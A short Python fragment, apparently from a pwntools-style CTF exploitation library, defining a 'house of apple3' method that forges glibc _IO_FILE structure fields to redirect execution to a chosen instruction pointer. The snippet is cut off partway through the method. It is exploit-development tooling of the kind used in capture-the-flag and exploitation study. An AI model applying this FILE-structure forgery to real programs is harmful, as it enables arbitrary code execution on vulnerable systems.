...
class IO_FILE_plus_struct(FileStructure):
    ...
    # house of apple3, target codecvt
    # shorter than apple2, but more annoying to control RDI
    def house_of_apple3(self, stdout_addr: int, lock_addr: int, rip: int, rcx=0):
        assert context.bits == 64, "only support amd64!"

        self.flags = 1
        self._IO_read_ptr = rcx + 0x4
        self._IO_read_end = rcx + 0x3
        self._IO_write_base = 0
        self._IO_write_ptr = 1
